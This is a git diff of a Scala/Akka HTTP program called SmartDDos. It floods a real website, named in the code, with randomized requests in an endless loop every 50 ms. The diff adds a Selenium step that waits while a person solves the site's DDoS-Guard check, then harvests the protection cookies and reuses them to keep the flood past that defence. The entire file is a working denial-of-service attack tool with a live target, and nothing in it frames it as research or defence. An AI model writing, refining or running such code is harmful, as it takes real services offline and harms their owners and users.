@@ -5,7 +5,9 @@ import akka.http.scaladsl.Http
 import akka.http.scaladsl.model.{HttpRequest, HttpResponse, StatusCodes, headers}
 import hi.Agents.getCustomClientAgent
 import hi.Test.randomQueryParam
+import org.openqa.selenium.chrome.ChromeDriver
 
+import scala.collection.mutable
 import scala.concurrent.{ExecutionContextExecutor, Future}
 
 object SmartDDos {
@@ -14,13 +16,8 @@ object SmartDDos {
 
   var cookieMap = scala.collection.mutable.HashMap.empty[String, String]
   cookieMap += ("" -> "")
-/*  cookieMap += ("__ddg5" -> "CerhqdIFojZ9MVAT")
-  cookieMap += ("__ddg2" -> "0Q2fU8u8jOJGHgeh")
-  cookieMap += ("__ddgid" -> "8YF4fMwnYNaWTn9E")
-  cookieMap += ("__ddgmark" -> "Jz3PiRCWmeLa3obz")
-  cookieMap += ("__ddg1" -> "F5gnvAGHRcd0Z3RzJlbN")*/
 
-  def innerRequest(url: String, recursion: Boolean, getCookie: Boolean = false)(implicit system: ActorSystem, executionContext: ExecutionContextExecutor): Future[Unit] = {
+  def innerRequest(url: String, recursion: Boolean)(implicit system: ActorSystem, executionContext: ExecutionContextExecutor): Future[Unit] = {
     val str = randomQueryParam(url)
 
     Http().singleRequest(HttpRequest(uri = str).withHeaders(
@@ -57,52 +54,9 @@ object SmartDDos {
           println(s"Запрос новых куков...")
 
           if(headers.exists(p => p.name() == "Server" && p.value() == "ddos-guard")) {
-            //agent = getCustomClientAgent
-            if(getCookie)
-              cookieMap.clear()
+            println(fetchCookies(url, cookieMap))
 
-            headers.find(_.value().startsWith("__ddgid")).foreach{
-                h =>
-                  val s = h.value().split(";").head.split("=")
-
-                  if (s.size == 2) {
-                    cookieMap += (s.head -> s(1))
-                  }
-            }
-            headers.find(_.value().startsWith("__ddgmark")).foreach{
-                h =>
-                  val s = h.value().split(";").head.split("=")
-
-                  if (s.size == 2) {
-                    cookieMap += (s.head -> s(1))
-                  }
-            }
-            headers.find(_.value().startsWith("__ddg5")).foreach{
-                h =>
-                  val s = h.value().split(";").head.split("=")
-
-                  if (s.size == 2) {
-                    cookieMap += (s.head -> s(1))
-                  }
-            }
-            headers.find(_.value().startsWith("__ddg1")).foreach{
-              h =>
-                val s = h.value().split(";").head.split("=")
-
-                if (s.size == 2) {
-                  cookieMap += (s.head -> s(1))
-                }
-            }
-            headers.find(_.value().startsWith("__ddg2")).foreach{
-              h =>
-                val s = h.value().split(";").head.split("=")
-
-                if (s.size == 2) {
-                  cookieMap += (s.head -> s(1))
-                }
-            }
-
-            innerRequest(url, recursion = true, getCookie = true)
+            innerRequest(url, recursion = true)
           }
         }
       case err =>
@@ -110,18 +64,36 @@ object SmartDDos {
     }
   }
 
-  val target = "https://xaknet.team/help.html"
+  implicit val webDriver: ChromeDriver = {
+    System.setProperty("webdriver.chrome.driver", "chromedriver")
+    System.setProperty("webdriver.chrome.silentOutput", "true")
+    new ChromeDriver()
+  }
+
+  //download https://chromedriver.chromium.org/downloads
+  //xattr -d com.apple.quarantine chromedriver
+  def fetchCookies(url: String, cookieMap: mutable.HashMap[String, String]) = {
+    webDriver.get(url)
+
+    //ждать 20 с пока пользователь пройдет ручную проверку
+    Thread.sleep(20000)
+
+    webDriver.manage().getCookies.forEach{
+      c =>
+        cookieMap += (c.getName -> c.getValue)
+    }
+  }
+
+  val target = "https://xaknet.team/"
 
   def main(args: Array[String]): Unit = {
     implicit val system: ActorSystem = ActorSystem()
     implicit val executionContext: ExecutionContextExecutor = system.dispatcher
 
-    val host = if (args.length == 1) {
-      args.head
-    } else target
+    println(fetchCookies(target, cookieMap))
 
     while (true) {
-      innerRequest(host, false)
+      innerRequest(target, false)
       Thread.sleep(50)
     }
   }
